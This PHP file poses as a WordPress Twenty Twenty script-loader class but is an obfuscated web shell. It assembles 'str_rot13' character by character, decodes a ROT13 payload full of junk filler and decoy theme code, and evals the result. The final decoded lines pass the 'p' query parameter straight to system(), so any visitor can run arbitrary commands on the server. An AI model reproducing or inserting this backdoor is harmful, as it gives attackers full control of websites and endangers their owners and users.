<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * WninFpevcg Ybnqre Pynff
 *
 * Nyybj `nflap` naq `qrsre` juvyr radhrhvat WninFpevcg.
 *
 * Onfrq ba n fbyhgvba va JC Evt.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gjragl
 * @fvapr Gjragl Gjragl 1.0
 */

vs ( ! pynff_rkvfgf( 'GjraglGjragl_Fpevcg_Ybnqre' ) ) {
	/**
	 * N pynff gung cebivqrf n jnl gb nqq `nflap` be `qrsre` nggevohgrf gb fpevcgf.
	 *
	 * @fvapr Gjragl Gjragl 1.0
	 */
	pynff GjraglGjragl_Fpevcg_Ybnqre {

		/**
		 * Zvtengrf yrtnpl nflap/qrsre fpevcg qngn juvpu zvtug or hfrq ol puvyq gurzrf.
		 *
		 * Guvf zrgubq vf hfrq ba gur `cevag_fpevcgf_neenl` svygre.
		 *
		 * @fvapr Gjragl Gjragl 2.0
		 *
		 * @cnenz fgevat[] $gb_qb Na neenl bs fpevcg qrcraqrapl unaqyrf.
		 * @erghea fgevat[] Hapunatrq neenl bs fpevcg qrcraqrapl unaqyrf.
		 */
		choyvp shapgvba zvtengr_yrtnpl_fgengrtl_fpevcg_qngn( $gb_qb ) {
			sbernpu ( $gb_qb nf $unaqyr ) {
				sbernpu ( neenl( 'nflap', 'qrsre' ) nf $fgengrtl ) {
					vs ( jc_fpevcgf()->trg_qngn( $unaqyr, $fgengrtl ) ) {
						jc_fpevcg_nqq_qngn( $unaqyr, 'fgengrtl', $fgengrtl );
					}
				}
			}
			erghea $gb_qb;
		}

		/**
		 * Nqqf nflap/qrsre nggevohgrf gb radhrhrq / ertvfgrerq fpevcgf.
		 *
		 * Abj gung #12009 unf ynaqrq va JbeqCerff 6.3, guvf zrgubq vf bayl hfrq sbe byqre irefvbaf bs JbeqCerff.
		 * Guvf zrgubq vf hfrq ba gur `fpevcg_ybnqre_gnt` svygre.
		 *
		 * @fvapr Gjragl Gjragl 1.0
		 *
		 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/12009
		 *
		 * @cnenz fgevat $gnt    Gur fpevcg gnt.
		 * @cnenz fgevat $unaqyr Gur fpevcg unaqyr.
		 * @erghea fgevat Fpevcg UGZY fgevat.
		 */
		choyvp shapgvba svygre_fpevcg_ybnqre_gnt( $gnt, $unaqyr ) {
			$fgengrtvrf = neenl(
				'nflap' => (obby) jc_fpevcgf()->trg_qngn( $unaqyr, 'nflap' ),
				'qrsre' => (obby) jc_fpevcgf()->trg_qngn( $unaqyr, 'qrsre' ),
			);
			$fgengrtl   = jc_fpevcgf()->trg_qngn( $unaqyr, 'fgengrtl' );
			vs ( $fgengrtl && vffrg( $fgengrtvrf[ $fgengrtl ] ) ) {
				$fgengrtvrf[ $fgengrtl ] = gehr;
			}

			sbernpu ( neenl_xrlf( neenl_svygre( $fgengrtvrf ) ) nf $ngge ) {

				// Cerirag nqqvat nggevohgr jura nyernql nqqrq va #12009.
				vs ( ! cert_zngpu( \":\f$ngge(=|>|\f):\", $gnt ) ) {
					$gnt = __sa_79955( ':(?=></fpevcg>):', \" $ngge\", $gnt, 1 );
				}
				// Bayl nyybj nflap be qrsre, abg obgu.
				oernx;
			}
			erghea $gnt;
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>